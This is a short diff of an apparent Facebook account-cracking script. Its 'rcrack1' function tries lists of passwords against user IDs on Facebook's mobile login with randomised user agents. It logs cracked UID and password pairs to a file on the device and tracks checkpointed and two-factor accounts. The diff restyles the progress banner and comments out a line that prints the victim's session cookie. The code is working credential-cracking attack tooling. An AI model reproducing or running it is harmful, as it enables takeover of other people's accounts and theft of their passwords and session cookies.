@@ -284,7 +284,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[%s/%s]OK:-%s'%(loop,tl,len(oks))),
+            sys.stdout.write('\r |\033[38;5;46mJIBON\033[1;97m | \033[38;5;45m%s\033[0m/%s | OK\033[1;97m:-\033[38;5;46m%s\033[1;97m | CP\033[1;97m:-\033[38;5;196m%s\033[1;97m | 2F\033[1;97m:-\033[38;5;45m%s\033[1;97m| \r'%(loop,tl,len(ok),len(cp),len(twf))),
             sys.stdout.flush()
             free_fb = session.get('https://p.facebook.com').text
             log_data = {
@@ -325,7 +325,7 @@ def rcrack1(uid,pwx,tl):
                 uid = "1000"+coki1[0:11]
                 #os.system("play-audio JIBON_OK.mp3")
                 print(f'\33[1;92m[JIBON-OK] '+uid+' | '+ps+'\33[0;92m')
-                print(f" Cookie : {coki}")
+                #print(f" Cookie : {coki}")
                 cek_apk(session,coki)
                 open('/sdcard/ MRX-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
